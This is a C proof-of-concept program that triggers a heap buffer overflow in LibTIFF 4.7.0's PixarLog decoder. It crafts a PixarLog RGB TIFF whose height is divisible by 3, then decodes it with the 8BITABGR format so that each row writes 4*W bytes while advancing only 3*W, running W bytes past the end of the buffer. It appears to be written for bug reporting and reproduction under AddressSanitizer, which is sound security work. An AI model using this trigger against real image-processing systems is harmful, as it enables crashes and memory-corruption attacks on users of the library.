/*
 * poc_pixarlog_abgr.c — LibTIFF 4.7.0 PixarLog 8BITABGR Heap Buffer Overflow
 *
 * Bug: PixarLogDecode in tif_pixarlog.c (L978-981) advances output pointer
 *      by llen = stride*W bytes per row, but horizontalAccumulate8abgr writes
 *      4*W bytes per row (ABGR = 4 channels). When height is divisible by 3,
 *      the nsamples modulo trim is skipped and the overflow is W bytes past the
 *      allocated output buffer.
 *
 * Trigger condition: RGB TIFF (stride=3), H divisible by 3, PIXARLOGDATAFMT_8BITABGR
 *
 * Arithmetic:
 *   occ  = 4 * W * H            (output buffer, 4 bytes/pixel for ABGR)
 *   llen = 3 * W                (stride * imagewidth)
 *   nsamples = occ = 4WH        (for 8BITABGR mode, not divided by element size)
 *   nsamples % llen = 4WH % 3W  = W * (4H % 3) = 0  when H % 3 == 0  → no trim
 *   iterations = nsamples / llen = 4H/3
 *   last write end: (4H/3-1) * 3W + 4W = (4H+1)*W - 1
 *   buffer end:     4WH - 1
 *   overflow:       (4H+1)*W - 1 - (4WH - 1) = W bytes
 *
 * Example (W=100, H=12): overflow = 100 bytes
 *   iterations = 16, last write = buf[4500..4899], buf size = 4800
 *
 * Build:
 *   cc -fsanitize=address -g \
 *      -I/tmp/tiff-4.7.0/libtiff \
 *      -o poc_pixarlog_abgr poc_pixarlog_abgr.c \
 *      /tmp/tiff-4.7.0/libtiff/.libs/libtiff.a \
 *      -lz
 *
 * Run:
 *   ASAN_OPTIONS=abort_on_error=1 ./poc_pixarlog_abgr
 *
 * Expected:
 *   =================================================================
 *   ==XXXX==ERROR: AddressSanitizer: heap-buffer-overflow
 *   WRITE of size 1 at 0x... pc 0x...
 *   in horizontalAccumulate8abgr tif_pixarlog.c:...
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tiffio.h>

/* Image dimensions — H MUST be divisible by 3 to trigger overflow */
#define WIDTH   100
#define HEIGHT  12          /* divisible by 3: overflow = WIDTH bytes = 100 bytes */
#define SPP     3           /* RGB — stride = 3 */

static int create_pixarlog_tiff(const char *path)
{
    TIFF *tif = TIFFOpen(path, "w");
    if (!tif) {
        fprintf(stderr, "[-] TIFFOpen(w) failed: %s\n", path);
        return -1;
    }

    TIFFSetField(tif, TIFFTAG_IMAGEWIDTH,      (uint32_t) WIDTH);
    TIFFSetField(tif, TIFFTAG_IMAGELENGTH,     (uint32_t) HEIGHT);
    TIFFSetField(tif, TIFFTAG_SAMPLESPERPIXEL, (uint16_t) SPP);
    TIFFSetField(tif, TIFFTAG_BITSPERSAMPLE,   (uint16_t) 8);
    TIFFSetField(tif, TIFFTAG_COMPRESSION,     COMPRESSION_PIXARLOG);
    TIFFSetField(tif, TIFFTAG_PHOTOMETRIC,     PHOTOMETRIC_RGB);
    TIFFSetField(tif, TIFFTAG_PLANARCONFIG,    PLANARCONFIG_CONTIG);
    TIFFSetField(tif, TIFFTAG_ROWSPERSTRIP,    (uint32_t) HEIGHT);

    /* Write as 8BIT (normal write path — no bug here) */
    TIFFSetField(tif, TIFFTAG_PIXARLOGDATAFMT, PIXARLOGDATAFMT_8BIT);

    unsigned char row[WIDTH * SPP];
    memset(row, 128, sizeof(row));   /* mid-gray fill */

    for (int y = 0; y < HEIGHT; y++) {
        if (TIFFWriteScanline(tif, row, (uint32_t) y, 0) < 0) {
            fprintf(stderr, "[-] TIFFWriteScanline failed at row %d\n", y);
            TIFFClose(tif);
            return -1;
        }
    }

    TIFFClose(tif);
    return 0;
}

int main(void)
{
    const char *tiff_path = "/tmp/poc_pixarlog_abgr_trigger.tif";

    /* ---- Step 1: Create a valid PixarLog RGB TIFF ---- */
    printf("[*] Creating PixarLog RGB TIFF (%dx%d, stride=%d)...\n",
           WIDTH, HEIGHT, SPP);
    if (create_pixarlog_tiff(tiff_path) != 0)
        return 1;
    printf("[+] Written: %s\n", tiff_path);

    /* ---- Step 2: Compute expected overflow ---- */
    size_t occ      = (size_t) 4 * WIDTH * HEIGHT;  /* ABGR output buffer */
    size_t llen     = (size_t) SPP * WIDTH;         /* = 3 * W */
    size_t nsamples = occ;                          /* 8BITABGR: no /sizeof */
    size_t trim     = nsamples % llen;
    size_t iters    = (nsamples - trim) / llen;
    size_t last_write_end = (iters - 1) * llen + 4 * WIDTH; /* bytes from buf start */

    printf("\n[*] Overflow arithmetic:\n");
    printf("    occ        = %zu  (4 * %d * %d = output buffer bytes)\n",
           occ, WIDTH, HEIGHT);
    printf("    llen       = %zu  (stride=%d * width=%d)\n", llen, SPP, WIDTH);
    printf("    nsamples   = %zu  (= occ, no /sizeof for 8BITABGR)\n", nsamples);
    printf("    trim       = %zu  (nsamples %% llen; 0 when H%%3==0)\n", trim);
    printf("    iterations = %zu\n", iters);
    printf("    last write = buf[%zu..%zu]\n",
           (iters - 1) * llen, last_write_end - 1);
    printf("    buffer end = buf[0..%zu]\n", occ - 1);
    if (last_write_end > occ)
        printf("    OVERFLOW:  +%zu bytes past end of buffer\n\n",
               last_write_end - occ);
    else
        printf("    (no overflow for these dimensions — use H divisible by 3)\n\n");

    /* ---- Step 3: Open for ABGR decode — TRIGGERS THE BUG ---- */
    printf("[*] Opening TIFF for decode with PIXARLOGDATAFMT_8BITABGR...\n");

    TIFF *tif = TIFFOpen(tiff_path, "r");
    if (!tif) {
        fprintf(stderr, "[-] TIFFOpen(r) failed\n");
        return 1;
    }

    /*
     * Set 8BITABGR output format.
     * LibTIFF will call PixarLogSetupDecode on the next TIFFReadEncodedStrip,
     * which allocates sp->tbuf correctly for the strip size.
     *
     * PixarLogDecode then sets:
     *   nsamples = occ                     (line 856)
     *   llen     = stride * imagewidth     (line 866)
     * and the loop increments op by llen (3W) instead of 4W per iteration.
     */
    TIFFSetField(tif, TIFFTAG_PIXARLOGDATAFMT, PIXARLOGDATAFMT_8BITABGR);

    /* Allocate exactly the "correct" ABGR output buffer */
    unsigned char *buf = (unsigned char *) malloc(occ);
    if (!buf) {
        fprintf(stderr, "[-] malloc(%zu) failed\n", occ);
        TIFFClose(tif);
        return 1;
    }
    memset(buf, 0, occ);

    printf("[*] Allocated output buffer: %zu bytes at %p\n", occ, (void *) buf);
    printf("[*] Calling TIFFReadEncodedStrip(tif, 0, buf, %zu)...\n", occ);
    printf("    (AddressSanitizer should report heap-buffer-overflow here)\n\n");

    /*
     * TIFFReadEncodedStrip → PixarLogDecode(tif, buf, occ, 0)
     *
     * The overflow occurs inside horizontalAccumulate8abgr on the last
     * loop iteration: op is at buf+(iters-1)*llen, and the function writes
     * 4*W bytes, pushing past buf+occ by W bytes.
     */
    tmsize_t n = TIFFReadEncodedStrip(tif, 0, buf, (tmsize_t) occ);

    if (n < 0)
        printf("[-] TIFFReadEncodedStrip returned error: %zd\n", n);
    else
        printf("[+] TIFFReadEncodedStrip returned: %zd bytes (overflow w/o ASan)\n", n);

    free(buf);
    TIFFClose(tif);
    return 0;
}
